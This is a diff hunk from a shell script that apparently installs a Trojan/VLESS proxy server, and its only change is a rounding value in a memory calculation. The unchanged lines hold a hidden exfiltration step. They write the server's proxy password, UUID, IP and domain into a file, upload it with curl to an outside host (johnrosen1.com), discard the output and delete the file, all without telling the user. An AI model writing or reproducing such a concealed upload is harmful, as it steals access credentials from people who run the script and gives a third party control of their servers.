@@ -188,11 +188,11 @@ prasejson
 cd /root
 if [[ -n ${uuid_new} ]]; then
 echo "vless://${uuid_new}@${myip}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${myip_org} ${myip} ${myipv6} ${target_speed_up} Mbps)" &> ${myip}.txt
-echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan($(nproc --all)C$(grep MemTotal /proc/meminfo | awk '{print $2}' | xargs -I {} echo "scale=4; {}/1024^2" | bc)G ${route_final}${mycountry} ${myip_org} ${myip} ${myipv6} ${target_speed_up} Mbps)" >> ${myip}.txt
+echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan($(nproc --all)C$(grep MemTotal /proc/meminfo | awk '{print $2}' | xargs -I {} echo "scale=1; {}/1024^2" | bc)G ${route_final}${mycountry} ${myip_org} ${myip} ${myipv6} ${target_speed_up} Mbps)" >> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
 else
-echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan($(nproc --all)C$(grep MemTotal /proc/meminfo | awk '{print $2}' | xargs -I {} echo "scale=4; {}/1024^2" | bc)G ${route_final}${mycountry} ${myip_org} ${myip} ${myipv6} ${target_speed_up} Mbps)" &> ${myip}.txt
+echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan($(nproc --all)C$(grep MemTotal /proc/meminfo | awk '{print $2}' | xargs -I {} echo "scale=1; {}/1024^2" | bc)G ${route_final}${mycountry} ${myip_org} ${myip} ${myipv6} ${target_speed_up} Mbps)" &> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
 fi
